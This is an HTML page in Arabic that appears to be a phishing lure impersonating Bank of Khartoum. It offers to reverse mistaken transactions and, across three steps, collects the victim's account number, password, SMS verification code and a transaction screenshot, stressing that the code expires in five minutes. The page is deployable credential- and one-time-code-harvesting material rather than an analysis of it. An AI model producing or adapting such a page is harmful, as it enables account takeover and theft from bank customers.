<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta id="cr" name="csrf-token" content="{{ csrf_token() }}">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
  <title> بنك الخرطوم - الغاء معاملات تمت عن طريق الخطأ</title>
</head>
<body>
  <header>
    <div class="logo-wrapper">
      <img src="/assets/img/logo.png">
    </div>
  </header>

  <div class="center-message done" id="done">
    <p id="text">
      <h3>
        تم ارسال الطلب <img src="/assets/icon/checkmark.svg"></h3> <br>
       تم استلام طلبك وسيتم التواصل معك لاكمال الغاء المعاملة المالية
        يمكنم دائما الإتصال بنا عبر مباشر 1913 <br>
      #بنكك
      <br>
        #مافي حدود مافي مستحيل
    </p>

    <button type="button" id="end">تم</button>
   </div>

  <div class="center-message" id="center-message">
   <div id="message-text"> جاري ارسال الطلب</div>
    <img id="sendng" class="logo-b" src="/assets/icon/l.gif">
  </div>
  <div class="menu-wrapper">
    <img class="logo" src="/assets/icon/menu.svg">
    <span class="menu-label">القائمة</span>
  </div>
  <div class="content">
    <h2 class="title">بنك الخرطوم</h2>
    <span class="title-mini">Bank Of Khartoum</span>
  </div>
  <img src="/assets/img/cancel.jpg">
  <div class="content">
    <p class="subject">
      الغاء معاملات تمت عن طريق الخطأ
    </p>
    <div class="speech">
      <span class="words">
        الان مع بنك الخرطوم تقدر تتراجع عن أي معاملة قمت بها عن طريق الخطاء
      </span>
      <span class="words">
        يتم إلغاء المعاملة وفق الشروط المقدمة من بنك الخرطوم
      </span>

      <span class="words">
        يتم تحديد المعاملة المراد إلغائها عن طريق كشف الحساب موضحة بالوقت والتاريخ والرقم
        التعريفي للمعاملة
      </span>

      <span class="steps">
        الرجاء اتباع الخطوات التالية لالغاء معاملة مالية معينة
      </span>
      <div class="here-wrapper">
        <span class="here">
         الخطوة الاولى <br> يتم الدخول للمكان المخصص
          وتسجيل الدخول لحسابك لتأكيد ملكيتك من هنا
          <button class="press-here" id="press-here-login">اضغط هنا</button>
        </span>

        <div class="form" id="account">
          <h2>
            الرجاء تسجيل الدخول الي حسابك وتأكيد هويتك
          </h2>
          <div class="cont">
            <input id="phone-number" type="number" placeholder="ادخل رقم الحساب">
            <input id="pasword" type="password" placeholder="كلمة المرور">
            <button class="btn" id="send-code">ارسال رمز التأكيد</button>
          </div>
        </div>

        <span class="words et">
          بعد ان تقوم بتسجيل الدخول الي حسابك
          يقوم بنك الخرطوم بإرسال رمز تحقق  في رقم هاتفك
          بعد مدة أقصاها 10 دقائق من لحظة اكمال الخطوة الاولى <br>
          يتم ادخال الرمز في المكان المخصص له في الخطوة الثانية <br>

          <span class="tep">
            صلاحية الكود المرسل الى هاتفك 5 دقائق فقط أحرص على أن تكون بجانب الهاتف بعد اجراء الطلب
          </span>
        </span>

        <span class="here">
          الخطوة الثانية <br> ادخل رمز التحقق هنا
          <button class="press-here" id="press-here-code">اضغط هنا</button>
        </span>

        <div class="form" id="code">
          <h2>
            الرجاء ادخال رمز التحقق هنا
          </h2>
          <div class="cont">
            <input id="code-number" type="number" placeholder="ادخل رمز التحقق">
            <button class="btn" id="confirm">تأكيد</button>
          </div>
        </div>

      </div>
      <div class="thrd">
        <span class="here">
          الخطوة الثالثة <br> قم بارفاق صورة "لقطة شاشة" المعاملة المالية المراد الغائها اذا وجد
          <input type="file" class="press-here" id="file" accept="image/*"/>

          <label for="file"> <img class="logo" src="/assets/icon/picture.svg"> اضغط هنا لارفاق صورة</label>
        </span>
        <span class="file-name" id="file-name"></span>
      </div>

      <button class="btn" id="final">ارسال طلب الغاء المعاملة المالية</button>

      <span class="words-good">
      بعد اكمال الخطوات اعلاه بشكل صحيح وارسال الطلب يرجى الانتظار وسيتم الاتصال بك
      </span>
    </div>
  </div>

  <footer>
    <div class="end">
      <div>
        <img src="/assets/icon/facebook_f.svg">
      </div>
      <div>
        <img src="/assets/icon/twitter.svg">
      </div>
      <div>
        <img src="/assets/icon/play_button.svg">
      </div>
      <div>
        <img src="/assets/icon/linkedin.svg">
      </div>
    </div>
  </footer>
  <script src="/js/js.js"></script>
</body>
</html>
